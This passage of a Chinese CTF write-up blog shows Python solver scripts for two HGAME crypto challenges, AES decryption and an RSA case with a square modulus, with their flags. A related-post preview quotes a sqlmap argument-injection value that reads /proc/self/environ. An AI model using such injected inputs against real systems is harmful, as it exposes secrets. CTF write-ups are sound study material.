class="string">b&#x27;\x1d6\xcc&#125;\x07\xfa7G\xbd\x01\xf0P4^Q&quot;\x85\x9f\xac\x98\x8f#\xb2\x12\xf4+\x05`\x80\x1a\xfa !\x9b\xa5\xc7g\xa8b\x89\x93\x1e\xedz\xd2M;\xa2&#x27;</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">flag = unpad(plaintext, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure>

<p>hgame{A_S1mple_Modul@r_Subset_Sum_Problem}</p>
<h3 id="sieve"><a href="#sieve" class="headerlink" title="sieve"></a>sieve</h3><p>GPT速通，提示词：题目是sieve，题目描述：两种不同孔径的筛子，才能筛干净。给我实际的解题代码，不要伪代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250210134910931.png" alt="image-20250210134910931"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为防止递归层数不足，可适当提高递归限制</span></span><br><span class="line">sys.setrecursionlimit(<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> primepi, nextprime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">summatory_phi</span>(<span class="params">n, cache=&#123;&#125;</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    快速计算 ∑_&#123;i=1&#125;^&#123;n&#125; φ(i)</span></span><br><span class="line"><span class="string">    利用公式：</span></span><br><span class="line"><span class="string">         F(n) = n(n+1)/2 - ∑_&#123;i=2&#125;^&#123;n&#125; (j - i + 1) * F(n//i)</span></span><br><span class="line"><span class="string">    其中对于区间 [i, j] 内 n//i 相同，可以合并求和。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> cache:</span><br><span class="line">        <span class="keyword">return</span> cache[n]</span><br><span class="line">    <span class="comment"># 基础公式：所有数的和 1+2+...+n = n(n+1)//2</span></span><br><span class="line">    res = n * (n + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    i = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">        <span class="comment"># n//i 在区间 [i, j] 内保持不变，令 j = n // (n//i)</span></span><br><span class="line">        j = n // (n // i)</span><br><span class="line">        res -= (j - i + <span class="number">1</span>) * summatory_phi(n // i, cache)</span><br><span class="line">        i = j + <span class="number">1</span></span><br><span class="line">    cache[n] = res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 给定的 RSA 公钥指数</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    <span class="comment"># N0 = e^2 // 6</span></span><br><span class="line">    N0 = e ** <span class="number">2</span> // <span class="number">6</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;开始计算 summatory_phi(<span class="subst">&#123;N0&#125;</span>) ...&quot;</span>)</span><br><span class="line">    sum_phi = summatory_phi(N0)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;∑φ(i) 计算完毕。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算 π(N0)</span></span><br><span class="line">    pi_N0 = primepi(N0)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;π(<span class="subst">&#123;N0&#125;</span>) = <span class="subst">&#123;pi_N0&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据题目 trick 函数的含义有 T = ∑_&#123;i=1&#125;^&#123;N0&#125; φ(i) + π(N0)</span></span><br><span class="line">    T = sum_phi + pi_N0</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;T = <span class="subst">&#123;T&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 左移 128 位，相当于乘以 2^128，再取下一个质数作为 p</span></span><br><span class="line">    T_shifted = T &lt;&lt; <span class="number">128</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始计算 p = nextprime(T &lt;&lt; 128) ...&quot;</span>)</span><br><span class="line">    p = nextprime(T_shifted)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;p 找到。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 模数 n = p^2 （注意 p = q）</span></span><br><span class="line">    n = p * p</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n 计算完毕。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 给定的密文</span></span><br><span class="line">    enc = <span class="number">2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对于 n = p^2，有 φ(n) = p*(p-1)</span></span><br><span class="line">    phi_n = p * (p - <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 计算 RSA 私钥 d，满足 e*d ≡ 1 (mod φ(n))</span></span><br><span class="line">    d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密： m = enc^d mod n</span></span><br><span class="line">    m = <span class="built_in">pow</span>(enc, d, n)</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;FLAG =&quot;</span>, flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>FLAG &#x3D; b’hgame{sieve_is_n0t_that_HArd}’</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://matriy330.github.io">Matriy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://matriy330.github.io/f2342e51/">http://matriy330.github.io/f2342e51/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://matriy330.github.io" target="_blank">Matriy's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post-share"><div class="social-share" data-image="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/media.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/zsm.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zsm.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/zfb.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zfb.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/f31bf17e/" title="2025 UCSC CTF WriteUp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/a01a8f5e-5a94-4f0d-9016-1c2c7a0bfb39.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-20</div><div class="info-item-2">2025 UCSC CTF WriteUp</div></div><div class="info-2"><div class="info-item-1">2025 UCSC CTF wp  Reverseeasy_re-ucsc简单异或 1234enc = &#x27;&#x27;&#x27;n=&lt;;:h2&lt;&#x27;?8:?&#x27;9hl9&#x27;h:l&gt;&#x27;2&gt;&gt;2&gt;hk=&gt;;:?&#x27;&#x27;&#x27;for i in range(0,len(enc)):    print(chr(ord(enc[i]) ^ 10),end=&#x27;&#x27;)  flag{d7610b86-5205-3bf3-b0f4-84484ba74105} EZ_debug-ucscdebug能看结果，下断点道最后就行，直接看 123for i in range(0,len(enc)):    print(chr(enc[i]),end=&#x27;&#x27;)  flag{709e9bdd-0858-9750-8c37-9b135b31f16d} simplere-ucsc...</div></div></div></a><a class="pagination-related" href="/9f6ee0bf/" title="BUUCTF-re-page1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250108211506668.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-25</div><div class="info-item-2">BUUCTF-re-page1</div></div><div class="info-2"><div class="info-item-1">BUUCTF-re-page1easyre 提交 reverse1跟进Str2，加flag   瞎了，上面还有个如果是o就换成0，改一改提交 {hell0_w0rld} reverse2flag：{hacking_for_fun} 但做了替换  flag{hack1ng_fo1_fun} 内涵的软件DBAPP{49d3c93df25caad81232130f3d2ebfad} flag{49d3c93df25caad81232130f3d2ebfad} 新年快乐upx壳，工具脱壳 xor 有个异或逻辑 跟进global  12345678910111213enc = [  0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11,  0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F,  0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F,  0x47, 0x32, 0x4F]for i...</div></div></div></a><a class="pagination-related" href="/c510533a/" title="DASCTF 2024最后一战 wp(复现)"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250506151553502.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-03</div><div class="info-item-2">DASCTF 2024最后一战 wp(复现)</div></div><div class="info-2"><div class="info-item-1">DASCTF 2024最后一战 wp(复现)checkin 访问即可  西湖论剑邀请函获取器get_env(name &#x3D; “FLAG”)即可 Webconst_python123456# 假设存在如下路由处理@app.route(&#x27;/load&#x27;)def load_data():    data = base64.b64decode(request.cookies.get(&#x27;data&#x27;))    obj = pickle.loads(data)     return &quot;Loaded&quot;  题目导入了 pickle、base64 等模块，且存在动态数据处理逻辑（如 Session 管理、身份验证），可能通过反序列化传递对象。 Pickle 协议的本质：Pickle 不是简单的数据序列化，而是能重建任意对象的协议。反序列化时会自动调用 __reduce__ 方法，该方法返回一个可执行函数和参数元组。 在线反弹shell生成工具 – Zgao’s...</div></div></div></a><a class="pagination-related" href="/26cd5c60/" title="MoeCTF-Web"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-09</div><div class="info-item-2">MoeCTF-Web</div></div><div class="info-2"><div class="info-item-1">MoeCTF-WebPetStore 题解(pickle反序列化)审计源码，小白没发现什么，看了提示是pickle序列化与反序列化，查看Dockerfile，flag在环境变量里 pickle模块提供了一种简单且强大的方法来实现对象的序列化和反序列化，使得开发者能够方便地将复杂的Python对象转化为字节流并在需要时重新还原。 基本使用 12345678import pickledata = &#123;&#x27;name&#x27;: &#x27;Alice&#x27;, &#x27;age&#x27;: 25&#125;serialized_data = pickle.dumps(data)deserialized_data =...</div></div></div></a><a class="pagination-related" href="/7b4e1f9f/" title="NCTF wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-04</div><div class="info-item-2">NCTF wp</div></div><div class="info-2"><div class="info-item-1">NCTF wp 主力re和pwn，这次pwn一道没出，因为不会socket，后面再学吧 Web[复现]sqlmap-mastersql注入 123/proc/self/environ 文件/proc/self/environ 文件存储了当前进程的环境变量列表。环境变量是一些键值对，用于传递配置信息给进程。每个变量之间用空字符（NULL）分隔，变量名用大写字母表示，其值用小写字母表示。可以通过以下命令查看当前进程的环境变量：  由于是sqlmap，可以使用哪些参数看看能够读出来 【网安神器篇】——Sqlmap详解_sqlmap读取文件-CSDN博客 1http://localhost -c /proc/self/environ  nctf{d92e168f-9936-4351-b72a-b4cc3dfe22d4} -c  # 从INI配置文件中读取选项 sqlmap基础知识（二）_sqlmap读文件-CSDN博客 赛后没想到还能这样 1https://localhost --eval...</div></div></div></a><a class="pagination-related" href="/29d0f785/" title="SCTF 2024 Re wp [复现]"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250413182536541.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-16</div><div class="info-item-2">SCTF 2024 Re wp [复现]</div></div><div class="info-2"><div class="info-item-1">SCTF 2024 Re wp...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Matriy</div><div class="author-info-description">不积硅步，无以至千里</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">198</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Matriy330"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">我是一个网安小白，一名安卓逆向工程师，Web安全开发工程师，二进制学习者</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HGAME-CTF"><span class="toc-text">HGAME CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hakuya-Want-A-Girl-Friend"><span class="toc-text">Hakuya Want A Girl Friend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-314-%E7%BA%BF%E6%80%A7%E8%B5%B0%E5%BB%8A%E4%B8%AD%E7%9A%84%E5%8F%8C%E7%94%9F%E5%AE%9E%E4%BD%93"><span class="toc-text">Level 314 线性走廊中的双生实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Computer-cleaner"><span class="toc-text">Computer cleaner</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Computer-cleaner-plus"><span class="toc-text">Computer cleaner plus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-729-%E6%98%93%E7%94%BB%E8%A1%8C"><span class="toc-text">Level 729 易画行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-24-Pacman"><span class="toc-text">Level 24 Pacman</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-47-BandBomb"><span class="toc-text">Level 47 BandBomb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-69-MysteryMessageBoard"><span class="toc-text">Level 69 MysteryMessageBoard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-38475-%E8%A7%92%E8%90%BD"><span class="toc-text">Level 38475 角落</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-21096-HoneyPot"><span class="toc-text">Level 21096 HoneyPot</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE"><span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Compress-dot-new"><span class="toc-text">Compress dot new</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Turtle"><span class="toc-text">Turtle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Delta-Erro0000ors-%E5%A4%8D%E7%8E%B0"><span class="toc-text">Delta Erro0000ors [复现]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8A%E5%98%9F%E5%81%87%E5%98%9F-%E5%A4%8D%E7%8E%B0"><span class="toc-text">尊嘟假嘟[复现]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#signin"><span class="toc-text">signin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#counting-petals"><span class="toc-text">counting petals</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezstack"><span class="toc-text">ezstack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#format"><span class="toc-text">format</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezBag"><span class="toc-text">ezBag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sieve"><span class="toc-text">sieve</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/29d0f785/" title="SCTF 2024 Re wp [复现]"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250413182536541.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SCTF 2024 Re wp [复现]"/></a><div class="content"><a class="title" href="/29d0f785/" title="SCTF 2024 Re wp [复现]">SCTF 2024 Re wp [复现]</a><time datetime="2025-05-15T16:00:00.000Z" title="发表于 2025-05-16 00:00:00">2025-05-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/850e6e3/" title="Magisk学习简介"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/v2-dbadb26e707dabf6723061583f9967b4_720w.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Magisk学习简介"/></a><div class="content"><a class="title" href="/850e6e3/" title="Magisk学习简介">Magisk学习简介</a><time datetime="2025-05-12T16:00:00.000Z" title="发表于 2025-05-13 00:00:00">2025-05-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/6a5921fa/" title="记录Frida spawn模式hook失败的问题(禁用usap)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/v2-dbadb26e707dabf6723061583f9967b4_720w.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记录Frida spawn模式hook失败的问题(禁用usap)"/></a><div class="content"><a class="title" href="/6a5921fa/" title="记录Frida spawn模式hook失败的问题(禁用usap)">记录Frida spawn模式hook失败的问题(禁用usap)</a><time datetime="2025-05-11T16:00:00.000Z" title="发表于 2025-05-12 00:00:00">2025-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/efdb165f/" title="记录一次安装Frida14.2.18的坑和解决方法"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/v2-dbadb26e707dabf6723061583f9967b4_720w.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记录一次安装Frida14.2.18的坑和解决方法"/></a><div class="content"><a class="title" href="/efdb165f/" title="记录一次安装Frida14.2.18的坑和解决方法">记录一次安装Frida14.2.18的坑和解决方法</a><time datetime="2025-05-10T16:00:00.000Z" title="发表于 2025-05-11 00:00:00">2025-05-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/1610ef8a/" title="Android逆向18-Unicorn"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/v2-dbadb26e707dabf6723061583f9967b4_720w.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android逆向18-Unicorn"/></a><div class="content"><a class="title" href="/1610ef8a/" title="Android逆向18-Unicorn">Android逆向18-Unicorn</a><time datetime="2025-05-09T16:00:00.000Z" title="发表于 2025-05-10 00:00:00">2025-05-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Matriy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p> <p>Hi, welcome to Matriy's <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">簡</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo.open-ctf.top/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = (el = document, path = location.pathname) => {
    twikoo.init({
      el: el.querySelector('#twikoo-wrap'),
      envId: 'https://twikoo.open-ctf.top/',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      },
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    GLOBAL_CONFIG_SITE.pageType === 'post' && getCount()

    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
      if (el.children.length) {
        el.innerHTML = ''
        el.classList.add('no-comment')
      }
    })
  }

  const loadTwikoo = (el, path) => {
    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
  }

  if (isShuoshuo) {
    'Twikoo' === 'Twikoo'
      ? window.shuoshuoComment = { loadComment: loadTwikoo }
      : window.loadOtherComment = loadTwikoo
    return
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
